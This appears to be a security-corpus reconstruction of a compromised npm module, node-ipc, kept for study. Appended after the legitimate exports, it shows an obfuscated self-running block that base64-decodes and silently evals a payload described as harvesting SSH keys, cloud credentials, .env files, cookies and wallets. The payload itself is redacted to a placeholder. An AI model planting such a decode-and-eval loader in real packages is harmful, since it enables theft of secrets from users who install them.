// SECURITY CORPUS ARTIFACT: representative reconstruction of MAL-2026-3744.
// The eval() in the IIFE below is the *malicious pattern being demonstrated*;
// the actual 80KB payload is replaced with a placeholder. Not executed by build script.
// node-ipc v9.1.6 — legitimate IPC module code (truncated for corpus)
'use strict';
const EventEmitter = require('events');
const net = require('net');

// ... (legitimate module code) ...

module.exports = { IPC: EventEmitter };

// --- appended by compromised publish ---
;(function(){
var _0x1a2b=['process','env','homedir','readFileSync',
  'join','https','request','write','end'];
var b64='REDACTED_80KB_OBFUSCATED_PAYLOAD_SEE_MAL-2026-3744';
// Decodes and executes credential harvester targeting SSH keys,
// .aws/credentials, .env files, browser cookies, crypto wallets
try{eval(Buffer.from(b64,'base64').toString());}catch(e){} // malicious: decode+exec
})();
